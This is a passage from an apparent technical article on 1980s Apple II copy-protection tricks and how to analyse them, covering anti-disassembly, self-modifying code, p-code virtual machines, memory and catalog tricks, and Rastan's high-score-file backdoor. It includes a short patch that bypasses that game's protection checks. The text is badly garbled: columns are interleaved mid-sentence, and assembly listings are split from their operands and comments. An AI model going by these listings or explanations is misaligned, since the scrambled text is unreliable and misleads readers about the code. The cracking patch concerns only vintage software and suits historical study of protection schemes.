It uses only two values on the stack: $3FF and $400.
An RTS transfers control to $3FF+1. The program
has an RTS at $400. The RTS at $400 transfers con-
trol to $400+1, the real entrypoint.
the two CPUs: $1B on a 6502, and $0B on a 65C02.
These days, it would be used as an emulator detec-
tion method. Try it in your favorite emulator to see
what happens.
SED
2 SEC
LDA #$20
4 SBC #$0F
7.14
Magic stack values
One way to obfuscate the code flow is through the
use of indirect transfers of control. Rescue At Rigel
7.15 Obfuscation
fills the stack entirely with the sequence #$12 #$11
#$10, and then performs an RTI without setting the
7.15.1 Anti-disassembly (aka WTF?
stack pointer to a constant value. Of course, it works
This technique is intended to prevent casual read-
reliably.
ing of the code—that is, static analysis, and specif-
Since there are only three values in the sequence,
ically targeting linear-sweep disassemblers—by in-
there should be only three cases to consider. If the
serting dummy opcodes into the stream, and using
stack pointer were #$F6 at the time of executing the
branch instructions to pass over them. At the time,
RTI instruction, then this causes the value #$12 and
recursive-descent disassembly was not common, so
$1011 to be fetched from $1F7. If the stack pointer
the technique was extremely effective.
were #$F7 at the time of executing the RTI instruc-
tion, then this causes the value #$11 and $1210 to be
fetched from $1F8. If the stack pointer were #$F8
at the time of executing the RTI instruction, then
this causes the value #$10 and $1112 to be fetched
from $1F9. The program has an RTS instruction at
the first and last of those locations. That yields two
Wings of Fury uses this technique, even for its
more cases to consider. The RTS at $1011 transfers
system
detection. The initial disassembly follows,
control to $1112+1. The RTS at $1112 transfers
with
undocumented
instructions such as RLA.
control to $1210+1. That leaves one more case to
consider. The program has an RTS instruction at
9600
ORA
( 0 ,X)
LDY
#$10
$1113. The RTS at $1113 transfers control to $1211. 2 9602
9604
BPL
$9616
So, both $1210 and $1211 are reachable this way.
4 9606
RLA
( $10 ,X)
Both addresses contain a NOP instruction, to allow
9608
NOP
the code to fall through to the real entrypoint
6 960A
BEQ
$95AC
960C
NOP
Note the phase “there should be.” There is one
STY
$84
special case. The remainder of 256 divided by three 8 960E
9610
STY
$18
is one. What is in that one byte? It’s the value #$10. 10 9612
CLC
So the first and last byte of the stack page is #$10,
9613
CLC
6312 9614
9616
14 9617
9618
16 961A
961C
18 961F
9621
20 9623
9625
22 9628
962A
24 962D
962F
26 9631
9632
28 9634
9635
30 9636
9638
32 963A
963B
34 963E
963F
36 9642
9644
BNE
CLC
CLC
BNE
SRE
STY
STX
ORA
CPX
STA
BEQ
LDA
ORA
ORA
ASL
LDX
ASL
ASL
LDY
BPL
BRK
JMP
TYA
STA
BNE
BRK
$961C
$960B
( $51 ) ,Y
$C009
$20 ,Y
( $10 ) ,Y
$84
$C008
$9672
$C088 ,X
( $18 ) ,Y
( $10 ) ,Y
#$27
#$10
$9630
$93BD
$400 ,X
$964C
; turn o f f the d r i v e
27 962A
LDA
$C088 ,X
; dummy i n s t r u c t i o n
29 962D
ORA
( $18 ) ,Y
; dummy i n s t r u c t i o n masks r e a l i n s t r u c t i o n
31 962F
ORA
( $10 ) ,Y
; dummy i n s t r u c t i o n i n f i r s t p a s s
33 ; opcode p a r a m e t e r i n s e c o n d p a s s
9631
ASL
35 ; l e n g t h o f e r r o r message
9632
LDX
#$27
37 ; two dummy i n s t r u c t i o n s
9634
ASL
39 9635
ASL
9636
LDY
#$10
41 ; u n c o n d i t i o n a l branch
; because Y i s p o s i t i v e
43 9638
BPL
$9630
963A
BRK
45 963B
JMP
$93BD
963E
TYA
47 963F
STA
$400 ,X
9642
BNE
$964C
49 9644
BRK
A third round disassembly:
Upon closer examination, we see the branch in-
struction at $9604 is unconditional, because the
value in the Y register is positive. That leads to the
branch at $9618. This branch is also unconditional,
because the value in the Y register is not zero. That
takes us into the middle of an instruction at $960B,
and requires a second round disassembly:
1 ; s t o r e #$64 a t $84
960B
LDY
#$64
3 960D
STY
$84
; f o u r dummy i n s t r u c t i o n s
5 960F
STY
$84
9611
CLC
7 9612
CLC
9613
CLC
9 ; u n c o n d i t i o n a l branch
; b e c a u s e Y i s not z e r o
11 9614
BNE
$961C
...
13 ; s w i t c h t o a u x i l i a r y memory bank , i f
available
961C
STY
$C009
15 ; s t o r e a l t e r n a t i v e v a l u e a t $84 ( $20+#$64=
$84 )
961F
STX
$20 ,Y
17 ; dummy i n s t r u c t i o n
9621
ORA
( $10 ) ,Y
19 ; compare t h e two v a l u e s
; w i l l d i f f e r i n 64 kb e nv i r on m e n t
21 9623
CPX
$84
; s w i t c h t o main memory bank
23 9625
STA
$C008
; branch i f 128 kb memory e x i s t s
25 9628
BEQ
$9672
1 ; u n c o n d i t i o n a l branch
; because Y i s p o s i t i v e
3 9630
BPL
$963C
...
5 ; message t e x t
963C
LDA
$9893 ,X
7 ; write to the screen
963F
STA
$400 ,X
9 ; u n c o n d i t i o n a l branch
; b e c a u s e A i s not z e r o
11 9642
BNE
$964C
The obfuscated code only gets worse from there,
but the intention is clear already
7.15.2
Self-modifying code
As the name implies, this technique relies on the
ability of code to modify itself at runtime, and to
have the modified version executed. A common use
of the technique is to improve performance by up-
dating an address with a loop during a memory copy,
for example. However, from the point of view of
copy-protection, the most common use is to change
the code flow, or to act as a light encoding layer.
Self-modifying code can be used to interfere with de-
buggers, because a breakpoint that is placed on the
modified instruction might be overwritten directly,
thus removing it, and resulting in uncontrolled ex-
ecution; or turned into an entirely unrelated (and
64possibly meaningless or even harmful) instruction,
with unpredictable results
Aquatron hides its protection check this way.
The initial disassembly looks like this, complete with
undocumented instructions such as ISB:
1 9600
9603
3 9606
9609
5 960B
960D
7 9610
9612
9 9614
9617
11 9618
961A
13 961D
961F
15 9620
9622
17 9624
9625
19 9627
DEC
ISB
LDA
EOR
BNE
JSR
STX
BNE
JMP
TYA
BCC
JSR
STX
BRK
STX
BNE
TYA
BPL
JMP
$9603
$9603
$9628
#$C9
$960E
$288D
$18 ,Y
$9615
$29A0
$961B
$59
$99 ,Y
$C8 ,Y
$9617
$9628
$2960
65Upon closer examination, we see references to
instructions at “hidden” offsets, and of course, the
direct modification of the instruction at $9603.
Second round disassembly:
1 9600
DEC
$9603
;−> INC $9603
3 ; undo s e l f −m o d i f i c a t i o n and c o n t i n u e
9603
ISB
$9603
5 9606
LDA
$9628
9609
EOR
#$C9
7 ; u n c o n d i t i o n a l branch
; b e c a u s e A i s not z e r o
9 960B
BNE
$960E
960D
.BYTE $20
11 ; r e p l a c e i n s t r u c t i o n below
960E
STA
$9628
13 9611
CLC
; u n c o n d i t i o n a l branch
15 ; b e c a u s e A i s not z e r o
9612
BNE
$9615
17 9614
.BYTE $4C
9615
LDY
#$29
19 9617
TYA
9618
BCC
$961B
21 961A
.BYTE $20
; de co de and s t o r e
23 961B
EOR
$9600 ,Y
961E
STA
$9600 ,Y
25 9621
INY
9622
BNE
$9617
27 9624
TYA
; u n c o n d i t i o n a l branch
29 ; b e c a u s e Y i s p o s i t i v e
9625
BPL
$9628
31 9627
.BYTE $4C
; s e l f −m o d i f i e d by $960E t o $A9 on f i r s t p a s s
33 ; r e s t o r e d t o $60 on s e c o n d p a s s
9628
RTS
35 ; decoded by $961B −9620 on f i r s t p a s s
; re −encoded on s e c o n d p a s s
37 9629
.BYTE $29
loader enters a loop which has no apparent exit con-
dition. Instead, the last sector to be read from disk
contains an identical copy of the loader code, except
for the last instruction which branches to a new lo-
cation upon completion. When combined with a
critically timing-dependent technique, such as read-
ing a sector while the head is moving, it becomes
extremely difficult to defeat.
7.15.4
Encryption (or, more correctly, enciphering) of code
was a popular technique, but the keys were always
very weak. The enciphering usually consisted of an
exclusive-OR of the byte with a fixed key. In some
cases, the key was a rolling value taken from the
byte just deciphered. In some rarer cases, multiple
keys were used
Goonies uses a rotate operation. However,
since the 6502 CPU does not have a plain rotate
instruction—only rotate with carry — the program
must set the carry bit correctly prior to the opera-
tion. The program does it this way:
1 ; save value
0405
PHA
3 ; extract carry bit
0406
LSR
5 ; r e s t o r e value
0407
PLA
7 ; r o t a t e with c a r r y
0408
ROR
Now we can see the decryption routine. It de-
codes the bytes at $9629-96FF, which contained a
check for a sector with special format. If the checked
passes, then the routine at $9600 is run again, which
reverses the changes that had been made — the bytes
at $9629-96FF are encoded again, and the routine
exits via the RTS instruction at $9628.
7.15.3
Encryption and compression
Compression of graphics was necessary to re-
duce the size of the data on disk, and to decrease
load times, since the reduced disk access more than
made up for the time spent to decompress the graph-
ics. The most common compression technique was
Run-Length Encoding (RLE), using a stream de-
rived from every second horizontal byte, or verti-
cal columns. More advanced compression, such as
something based on Lempel-Ziv, was generally con-
sidered to be too slow to use.
Perhaps based on the assumption that LZ-based
compression was too slow, compression of code
seems to have been entirely absent until recently—all
Self-overwriting code
When self-modification is taken to the extreme, the
result is self-overwriting code. There, the RWTS
routine reads sector data over itself, in order to
change the execution behavior, and potentially re-
move user-defined modifications such as breakpoints
or detours. LifeSaver uses this technique. The
66of my releases use my decompressor for aPLib 54 , for
an almost exact or even slightly reduced load time,
which shows that the previous assumption was quite
wrong. Others have had success with my decompres-
sor for LZ4 55 when used for graphics. A more recent
LZ4-based project is also showing promise. 56
7.16
0A
2 0B
0C
INC ABSOLUTE
nothing
LDA ABSOLUTE, A ; p−code A r e g i s t e r
Virtual machines
One of the most powerful forms of obfuscation is
the virtual machine. Instead of readable assembly
language that we can recognise, the virtual machine
code replaces instructions with bytes whose meaning
might depend on the parameters that follow them.
Electronic Arts were famous for their use of pseudo-
code (p-code) to hide the protection routines in pro-
grams such as Archon and Last Gladiator. That vir-
tual machine was even ported to the Commodore 64
platform.
Last Gladiator uses a top-level virtual machine
that has 17 instructions. The instructions look like
this:
00
2 01
02
4 03
04
6 05
06
8 07
08
10 09
0A
12 0B
0C
14 0D
0E
16 0F
10
18 11
virtual machine is interesting for one particular rea-
son. While it looks identical to the first one, it’s not
exactly the same. For one thing, there are only 13 in-
structions. For another, two of them have swapped
places:
JMP
CALL NATIVE
BEQ
LDA IMM
LDA ABSOLUTE
JSR
STA ABSOLUTE
SBC IMM
JMP NATIVE
RTS
LDA ABSOLUTE, A ; p−code A r e g i s t e r
ASL
INC ABSOLUTE
ADC ABSOLUTE
XOR ABSOLUTE
BNE
SBC ABSOLUTE
MOVS
These two engines were not the only ones that
Electronic Arts used, either. Hard Hat Mack uses a
version that had twelve instructions.
1 00
01
3 02
03
5 04
05
7 06
07
9 08
09
11 0A
0B
JMP
CALL NATIVE
BEQ
LDA IMM
LDA ABSOLUTE
JSR
STA ABSOLUTE
SBC IMM
JMP NATIVE
RTS
LDA ABSOLUTE, A ; p−code A r e g i s t e r
ASL
Following that virtual machine was yet another
variation. This one has only eleven instructions.
Nine of the instructions are identical in value to
the previous virtual machine. The differences are
that “ASL” is missing, and the “LDA ABSOLUTE, A”
instruction is now “INC ABSOLUTE.”
However, in between those two virtual machines
was an entirely different virtual machine. It is a
stack-based engine that uses function pointers in-
stead of byte-code. It looks like this, if you’ll forgive
handler address in place of names I wasn’t able to
identify.
It has the ability to transfer control into 6502 2
routines, via the instructions that I named “call na- 4
tive” and “jmp native.” The parameters to the in-
structions were XORed with different values to make 6
the disassembly even more difficult. Since the vir-
8
tual machine could read arbitrary memory, it was
used to access the soft-switches, in order to turn the 10
drive on and off. Once past the first virtual ma-
chine, the program ran a second one. The second
54 http://pferrie.host22.com/misc/aplibunp.zip
55 http://pferrie.host22.com/misc/lz4unp.zip
56 https://github.com/fadden/fhpack
67
9DF2
9DF4
9DF6
9DF8
9DFA
9DFC
9DFE
9E00
9E02
9E04
.WORD
.WORD
.WORD
.WORD
.WORD
.WORD
.WORD
.WORD
.WORD
.WORD
xsave_retpc
xpush_imm
$95FF
xpush_imm
$A600
xchkstk_vars
xbeq_rel
4
xdo_copy_prot
xjmp_retpcThis virtual machine is Forth. Amnesia, includ-
LDA
#>b e g h i
ing its copy-protection (What You Know style), was 2 STA
$3D
written entirely in Forth. The Toy Shop used an-
LDA
#<b e g l o
$3C
other virtual machine, which combined byte-code 4 STA
LDA
#>e n d h i
and function pointers, depending on which function
6 STA
$3F
was called, and all mixed freely with native code.
LDA
#<e n d l o
Its identity is not known.
8 STA
$3E
LDA
#>cmphi
Of course, the most famous of all virtual ma-
$43
chines is the one inside Pascal, an ancestor of Del- 10 STA
LDA
#<cmplo
phi that was very widely used in the eighties. Wiz- 12 STA
$42
ardry is perhaps the most well-known Pascal pro-
JSR
$FE36
gram on the Apple ][ system, and the Pascal virtual
machine made it a simple task to port the program
to other platforms. The advantage of a virtual ma-
For our fourth example, there is an RTS instruc-
chine is that only the interpreter must be ported,
tion at a known location. A jump to this instruc-
rather than the entire system. Since the language
tion will simply return. It is usually used to deter-
is much higher-level than assembly language, it also
mine the value of the Program Counter. However,
allows for a faster development time. It also makes
it can just as easily be used to hide a transfer of
de-protecting a program much harder
control, taking into account that the destination ad-
dress must be one less than the true value, like this
to jump to $200:
7.17 ROM regions
The Apple ][ ROM BIOS is full of little routines
whose intention is clear, but whose meaning can be
changed depending on the context. That leads into
an interesting area of obfuscation and indirection.
For our first example, there is a routine to save the
register contents. It is used by the ROM BIOS code
when a breakpoint occurs. It has the side-effect of
returning the status register in the A register. That
allows a program to replace the instruction pair PHP;
PLA with the instruction JSR $FF4A for the same pri-
mary effect (it has the side-effect of altering several
memory locations), but one byte larger.
For our second example, there is a routine to
clear the primary text screen. Since the Apple ][
has a text and graphics mode that share the same
memory region, there is one routine for clearing the
screen while in text mode, and another for clear-
ing the screen while in graphics mode. However, it
is possible to use the graphics routine to clear the
screen even while in text mode. That allows a pro-
gram to replace JSR $FC58 with JSR $F832 for the
same major effect. (It has the side-effect of altering
several memory locations.)
For our third example, there is a routine to com-
pare two regions of memory. It is used primarily to
ensure that memory is functioning correctly. How-
ever, it can also be used to detect alterations that as
those produced by a user attempting to patch a pro-
gram. All that is required is to set the parameters
correctly, like this:
1 LDA
PHA
3 LDA
PHA
5 JMP
#$01
#$FF
$FF58
And so on. The first three examples are taken
from Lady Tut, though in the third example, the
parameters are also set in an obfuscated way, us-
ing shifts, increments, and constants. The fourth is
taken from Mr. Do!.
7.18
Sensitive memory locations
There are certain regions in memory, in which
modifications can be made which will cause inten-
tional side-effects. The side-effects include code-
destruction when viewed, or automatic execution in
response to any typed input, among other things.
The zero-page is a rich source of targets, because it
is shared by so many things.
The most commonly altered regions follow.
7.18.1
Scroll window
When the monitor is active, the scrollable region
of the screen can be adjusted to allow “fixed” rows
and/or columns. The four locations, left ($20),
width ($21), top ($22), and bottom ($23) can also
be adjusted. A program can protect itself from de-
bugging attempts by altering these values to make a
68very small window, or even to cause overlapping re-
gions that will cause memory corruption if scrolling
occurs.
7.18.2
7.18.3
Monitor
The monitor prompt allows a user to view and al-
ter memory, and execute subroutines. It uses sev-
eral zero-page addresses in order to do this. Any-
thing that is stored in those locations ($31, $34-35,
$3A-43, $45-49) will be lost when the monitor be-
comes active. In addition, the monitor uses the
ROM BIOS routine RDKEY. RDKEY provides a
pseudo-random number generator, by measuring the
time between keypresses. It stores that time in
$4E-4F.
Falcons uses address $31 to hold the rolling
checksum, and checks if $47 is constant after ini-
tialising it.
Classmate uses addresses $31 and $4E to hold
two of the data field prologue bytes.
I/O vectors
There are two I/O vectors in the Apple ][, one
for output—CSW ($36-37), and one for input—KSW
($38-39). CSW is invoked whenever the ROM
BIOS routine COUT is called to display text. KSW
is invoked whenever the ROM BIOS routine RD-
KEY is called to wait for user input. Both of these
vectors are hooked by DOS in order to intercept
commands that are typed at the prompt. Both of
these vectors are often forcibly restored to their de-
fault values to unhook debuggers. They are some-
times altered to point to disk access routines, to pre-
vent user interaction. Championship Lode Runner
uses the hooks for disk access routines in order to
load the level data from the disk.
7.18.4
The “LOCK” mystery
There is a special memory location in Applesoft
($D6) which is named the “AppleSoft Mystery Pa-
69rameter” in What’s Where In The Apple. It is also
named “LOCK” in the Applesoft Internals disassem-
bly, which gives a better idea of its purpose. When
set to #$80, all Applesoft commands are interpreted
as meaning “RUN.” This prevents any user inter-
action at the Applesoft prompt. Tycoon uses this
technique.
7.18.5
7.18.7
The input buffer is a single 256-bytes page
($200-2FF) in the Apple ][. Code and data can be
placed in the input buffer, and run from there. How-
ever, anything that the user types at the prompt,
and which is routed through the ROM BIOS routine
GETLN ($FD6A), will be written to the input buffer.
Any user interaction that occurs, such as breaking
to the prompt, will cause corruption of the code in
the input buffer. Karateka uses this technique.
Stack
The stack is a single 256-bytes page ($100-1FF) in
the Apple ][. Since the standard Apple ][ environ-
ment does not have any source of interrupts, the
stack can be considered to be a well-defined mem-
ory region. This means that code and data can be
placed on the stack, and run from there, without re-
gard to the value of the stack pointer, and modifica-
tions will not occur unexpectedly. (The effect on the
stack of subroutine calling is an expected modifica-
tion.) If an interrupt occurred, then the CPU would
save the program counter and status register on the
stack, thus corrupting the code or data that existed
below the current stack pointer. (The corruption
can even be above the stack pointer, if the stack
pointer value is low enough that it wraps around!)
Correspondingly, any user interaction that occurs,
such as breaking to the prompt, will cause corrup-
tion of the code or data that exist below the current
stack pointer. Choplifter uses this technique.
7.18.6
Input buffer
7.18.8
Primary text screen
The primary text screen is a set of four 256-bytes
pages ($400-7FF) in the Apple ][. Code and data
can be placed in the text screen memory, and run
from there. The visible screen was usually switched
to a blank graphics screen prior to that occurring, to
avoid visibly displaying garbage, and perhaps caus-
ing the user to think that the program was malfunc-
tioning. Obviously, any user interaction that occurs
through the ROM BIOS routines, such as break-
ing to the prompt and typing commands, will cause
corruption of the code in the text screen. Joust uses
this technique to hold essential data.
7.18.9
Non-maskable interrupt vector
When a non-maskable interrupt (NMI) occurs,
the Apple ][ saves the status register and pro-
gram counter onto the stack, reads the vector at
$FFFA-FFFB, and then starts executing from the
specified address. The ROM BIOS handler imme-
diately transfers control to the code at $3FB-3FD,
which is usually a jump instruction to the complete
NMI handler. For programs that were very heav-
ily protected, such that inserting breakpoints was
difficult because of hooked CSW and KSW vectors,
for example, one alternative was to “glitch” the sys-
tem by using a NMI card to force a NMI to occur.
However, that technique required direct access to
memory in order to install the jump instruction at
$3FB-3FD, since the standard ROM BIOS does not
place one there
On a 64kb Apple ][, the ROM BIOS could be
copied into banked memory and made writable. The
BIOS NMI vector could then be changed directly,
potentially bypassing the user-defined NMI vector
completely.
Stack pointer
Since the standard Apple ][ environment does not
have any source of interrupts, the stack pointer
can be considered to be a register with well-defined
value. This means that its value remains under pro-
gram control at all times and that it can even be
used as a general-purpose register, provided that
the effect on the stack pointer of subroutine call-
ing is expected by the program. Beer Run uses this
technique.
LifeSaver also uses this technique for the pur-
pose of obfuscating a transfer of control—the pro-
gram checksums the pages of memory that were read
in, and then uses the result as the new stack pointer,
just prior to executing a “return from subroutine” in-
struction. Any alteration to the data, such as the
insertion of breakpoints or detours, results in a dif-
ferent checksum and unpredictable behavior.
707.18.10
Reset vector
reaches the specified address. The typical protected
program response to breakpoints was to erase all
of memory and then reboot. An alternative protec-
tion is to point $3F0-3F1 to another BRK instruction,
to produce an infinite loop and hang the machine.
Bank Street Writer III uses this technique.
On a 64kb Apple ][, the ROM BIOS can be
copied into banked memory and made writable. The
BIOS IRQ vector can then be changed directly, po-
tentially bypassing the user-defined IRQ vector com-
pletely.
On a cold start, and whenever the user presses Ctrl-
Reset, the Apple ][ reads the vector at $FFFC-FFFD,
and then starts executing from the specified address.
If the Apple ][ is configured with an Autostart ROM,
then the warm-start vector at $3F2-3F3 is used, if
the “power-up” byte at $3F4 matched the exclusive-
OR of #$A5 with the value at $3F3 57 . The values at
$3F2-3F4 are always writable, allowing a program
to protect itself against a user pressing Ctrl-Reset in
order to gain access to the monitor prompt, and then
saving the contents of memory. The typical pro-
tected program response to Ctrl-Reset was to erase
all of memory and then reboot.
On a 64kb Apple ][, the ROM can be copied into
banked memory and made writable. When the user
presses Ctrl-Reset on an Apple ][+, the ROM BIOS
is not banked in first, meaning that the cold-start re-
set vector can be changed directly, and will be used,
potentially bypassing the warm-start reset vector
completely. On an Apple ][e or later, the ROM BIOS
is banked in first, meaning that the modified BIOS
cold-start reset vector will never be executed, and so
the warm-start reset vector cannot be overridden.
7.18.11
7.19 Catalog tricks
7.19.1 Control-“Break”
On a regular DOS disk, there is a sector called the
Volume Table Of Contents (VTOC), which describes
the starting location (track and sector) of the cata-
log, among other things. The catalog sectors contain
the list on the disk of files which are accessible by
DOS. For a file-based program, apart from the DOS
and the catalog-related structures, all other content
is accessible through the files listed in the catalog.
DOS “knows” the track which holds the VTOC, since
the track number (usually #$11) is hard-coded in
DOS itself, and sector zero is assumed to be the one
that holds the VTOC.
Since the files are listable, they can also be
loaded from the original disk, and then saved to a
copy of the disk. One way to prevent that is to insert
control-characters in the filenames. Since control-
characters are not visible from the DOS prompt, any
attempt to load a file, using the name exactly as it
appears, will fail.
Classmate uses this technique. It is also possi-
ble to embed backspace characters into the filename.
Filenames with backspace characters in them cannot
be loaded from the prompt. Instead, a Basic pro-
gram must be written with printable characters as
placeholders, and then the memory image must be
altered to replace them with backspace characters
Interrupt request vector
Despite not having a source of interrupts in the de-
fault configuration, the Apple ][ did offer support for
handling them. When an interrupt request (IRQ)
occurs, the Apple ][ saves the status register and
program counter onto the stack, reads the vector
at $FFFE-FFFF, and then starts executing from the
specified address. However, there is also a special
case IRQ, which is triggered by the BRK instruction.
This instruction is a single-byte breakpoint instruc-
tion, and is intended for debugging purposes. The
ROM BIOS handler checks the source of the inter-
rupt, and transfers control to the vector at $3FE-3FF
if the source was an external interrupt. On the Au-
tostart ROM, the ROM BIOS handler transfers con-
trol to the vector at $3F0-3F1 if the source was a
breakpoint. (Pre-Autostart ROMs simply dumped
the register values to the screen, and then dropped
to the monitor prompt instead.) The values at
$3F0-3F1, and $3FE-3FF are always writable, allow-
ing a program to protect itself against a user insert-
ing breakpoints in order to break when execution
7.19.2
Now you see it
Since the VTOC also carries the sector of the cat-
alog, it can be altered to point to another location
within the track that holds the VTOC. That causes
57 This is true only when the full warm-start vector is not #$00 #$E0 #$45 ($E000 and #$45). If the vector is $E000 and #$45,
then the cold-start handler will change it to $E003, and resume execution from $E000. This behavior could have been used as
an indirect transfer of control on the Apple ][+, by jumping back to the cold-start handler, which would look like an infinite
loop, but it would actually resume execution from $E003.
71the disk to display a “fake” catalog, while allowing a
program to access the real catalog sectors directly.
The Toy Shop uses this technique to show the
program title, copyright, and author credits.
7.19.3
801:13 08 03 00 BA 22 30 22 00 1C 08 01 00 BA
22
810:31 22 00 0A 08 03 00 BA 22 32 22 00 00 00
This program contains three lines, numbered
from zero to two. The list will show the second
and third lines in reverse order. The illusion is com-
pleted by altering the line number of the first line
to a value larger than the other lines. However, the
execution of the first line first cannot be altered in
this way.
Now you don’t
Since DOS carries a hard-coded track number for the
VTOC, it is easy to patch DOS to look at a different
track entirely. The original default track can then
be used for data. Any attempt to show the catalog
from a regular DOS disk will display garbage.
Ali Baba uses this technique, by moving the en-
tire catalog track to track five.
7.20 Basic tricks
7.20.1 Line linking
Out-of-bounds
The listing can even be forced to fetch from arbi-
trary memory, such as the graphics screen or the
memory-mapped I/O space:
801:55 C0 00 00 3A 00 00 00
This program contains a single line whose line
number is zero, and whose content is a single “:”. An
attempt to list this program will cause the second
text screen to be displayed instead, and the machine
will appear to crash. Further misdirection is possi-
ble by placing an entirely different program at an
alternative location, which will be listed instead
Imagine the feeling when the drive light turns
itself on while the program is being listed!
It might even be possible to create a program
with lines that touch the memory-mapped I/O
space, and activate or deactivate a stepper-motor
phase. If those lines were listed in a specific order,
then the drive could be enticed to move to a differ-
ent track. That track could lie about its position on
the disk, but carry alternative content to the proper
track, resulting in perhaps subtly different behavior.
Are we having fun yet?
Circularly
In Basic on the Apple ][, each line contains a refer-
ence to the next line to list. As such, several inter-
esting effects are possible. For example, the listing
can be made circular, by pointing to a previous line,
causing an infinite loop of listing. The simplest ex-
ample of that looks like this:
801:01 08 00 00 3A 00 00 00
This program contains one line whose line num-
ber is zero, and whose content is a single “:”. An
attempt to list this program will show an infinite
number of “0 :” lines. However it can be executed
without issue.
Missing
The listing can be forced to skip lines, by pointing
to a line that appears after the next line, like this:
801:10 08 00 00 3A 00 10 08 01 00 BA 22
80D:31 22 00 16 08 02 00 3A 00 00 00
Listing the program will show two lines:
7.20.2
Start address
The first line of code to execute can be altered
dynamically at runtime, by a “POKE 103, <low
addr>” and/or “POKE 104, <high addr>”, followed
by a “RUN” command. Math Blaster uses this tech-
nique.
1 0 :
2 :
However, there is a second line (numbered “one”)
which contains a PRINT statement. Running the
program will display the text in line one.
7.20.3
Line address
Normally, the execution will generally proceed lin-
early through the program (excluding instructions
that legally transfer control, such as subroutine calls
and loops), regardless of the references to individual
lines. However, the next line (technically, the next
Out-of-order
The listing can list lines in an order that does not
match the execution, for example, backwards:
72token) to execute can be altered dynamically at run-
time, by a “POKE 184, <low addr>”. The first value
at the new location must be a ’:’ character. For
example, this program:
A “FOR” loop must be terminated by a “NEXT”
token, in order to be legal code. Notice that the
program does not contain a “NEXT” token, as ex-
pected. Instead, the values in the DATA line supply
the “NEXT” token and a subsequent “:”. The inclu-
sion of a “:” allows extending the line further, simply
by adding more values to the “DATA” line and al-
tering the corresponding address of the “POKE”.
By using this technique, even entirely new lines
can be created.
0 POKE 1 8 4 , 1 4 : END : PRINT " ! "
will skip the “END” token and print the ’ !’ instead. It
is also possible to alter the high address by a “POKE
185, <high address>” as well, but it requires that
the second POKE is placed at the new location,
which is determined by the new value of the high
address and the old value of the low address. It
cannot be placed immediately after the address of
the first POKE, because that location will not be
accessed anymore.
7.20.4
7.21
Rastan is mentioned here only because it is a title
for an Apple ][ system (okay, the IIGS) that carried
the means to bypass its own copy-protection! The
program contained two copy-protection techniques.
One was a disk verification check, which executed
shortly after inserting the second disk. The other
was a checksum routine which performed part of
the calculation between each graphics frame, until
it formed the complete value. If the match failed,
only then would it display a message. It means that
the game would run for a little while before failing,
making it extremely difficult to determine where the
check was performed.
“REM crash”
801:0E 08 00 00 B2 0D 04 50 52 23 36 0D 00 00
00
This program contains one line, which looks like
the following, where the “^” character stands for the
Control key.
1 0 REM^M^DPR#6^M
7.21.1
Self-modification
A program can even modify itself dynamically at
runtime. For example, this program will display
“2” instead of “1”. The address of the POKE cor-
responds to the location of the text in memory.
1 0 POKE 2 0 6 4 , 5 0 : PRINT "1"
A program can also extend its code dynamically
at runtime:
1 0 DATA 1 3 0 , 5 8
1 FOR I =0 TO 1 : READ X : POKE 2086+ I ,X :
The Rastan backdoor
In order to avoid waiting for the protection check
every time a new version of the code was built, the
author 58 inserted a “backdoor” routine which exe-
cuted before the first protection check could run.
The backdoor routine had the ability to disable both
protection checks in memory, as well as to add new
functionality, such as invincibility and level warp-
ing. And where was this backdoor routine located?
Inside the highscore file!
Yes. The highscore file had a special format,
whereby code could be placed beginning at the third
byte of the file. As long as the checksum of the file
was valid (an exclusive-OR of every byte of the file
yielded a zero), the code would be executed.
Here is the dispatcher code in Rastan:
When listed with DOS active, it will trigger a
reboot. It works because the same I/O routine is
used for displaying the text as for typing commands
from the keyboard. Zardax uses this technique.
7.20.5
Rastan
. A16
2 ; checksum data
2000D
JSR
$21216
4 ; note t h i s address
20010
JSR
$2D1C2
58 https://twitter.com/JBrooksBSI
73on both sides. As the protectors came to under-
stand the hardware more and more, they were able
to develop techniques like delayed fetch, or consec-
utive quarter-tracks. The crackers came up with
NMI cards, and the mighty E.D.D. In response, the
protectors hooked the NMI vector and exploited a
vulnerability in E.D.D.’s read routine. (This is my
absolute favorite technique.) The crackers just boot-
traced the whole thing.
We can only stand and admire the ingenuity and
inventiveness of the protectors like Roland Gustafs-
son or John Brooks. They were helped by the
openness of the Apple ][ platform and especially
its disk system. Even today, we see some of the
same styles of protections—anti-disassembly, self-
modifying code, compression, and, of course, anti-
debugging.
The cycle really is never-ending.
Here is the checksum routine:
1 . A16
; source address
3 21216
TXA
; t a k e n i f no h i g h s c o r e f i l e
5 21217
BEQ
$21240
; l e n g t h o f data
7 21219
LDA
$0 ,X
2121D
TAY
9 2121E
SEP
#$20
. A8
11 21220
PHX
; checksum s e e d
13 21221
LDA
#0
; checksum data
15 21223
EOR
$0 ,X
21227
INX
17 21228
DEY
21229
BNE
$21223
19 2122B
PLX
2122C
REP
#$30
21 . A16
2122E
AND
#$FF
23 ; t a k e n i f bad checksum , no copy
21231
BNE
$21240
25 ; l e n g t h o f data
21233
LDA
$0 ,X
27 21237
DEC
21238
LDY
#$D1C0
29 ; copy t o $2D1C0
2123B
MVN
#2, #0
31 2123E
PHK
2123F
PLB
33 21240
RTS
7.23
Thanks to William F. Luebbert for What’s Where
In The Apple, and Don Worth and Pieter Lechner
for Beneath Apple DOS. Both books have been on
my bookshelf since 1983, and were consulted very
often while writing this paper.
Thanks to reviewers 4am, Olivier Guinart, and
John Brooks, for their invaluable input
We can see that the data are copied to $2D1C0,
the first word is the length of the data, and the first
byte after the length (so $2D1C2) is executed directly
in 16-bit mode. By default, the file carried an im-
mediate return instruction, but it could have been
anything, including this:
1 ; always pass p r o t e c t i o n
; (BRA $+$0F )
3 2D1C2
LDA
#$0D80
2D1C5
STA
$22004
5 ; a l w a y s p a s s checksum
; (BRA $+$19 )
7 2D1C8
LDA
#$1780
2D1CB
STA
$3CAD0
9 2D1CE
RTS
7.22
Acknowledgements
Conclusion
There were many tricks used to protect programs on
the Apple ][, and what is listed here is not even all
of them. Copy-protection and cracking were part
of a never-ending cycle of invention and advances
74758
Reverse Engineering the Tytera MD380
by Travis Goodspeed KK4VCZ,
with kind thanks to DD4CR and W7PCH.
similar to P25 that I’ll just refer you to Why (Spe-
cial Agent) Johnny (Still) Can’t Encrypt by Sandy
Clark and Friends. 59
8.1
Hardware Overview
SP- D-
SP+
Speaker
Microphone
D+
The following is an adventure of reverse engi-
neering the Tytera MD380, a digital hand-held ra-
dio that can be had for barely more than a hundred
bucks. In this article, I explain how to read and
write the radio’s configuration over USB, and how
to break the readout protection on its firmware, so
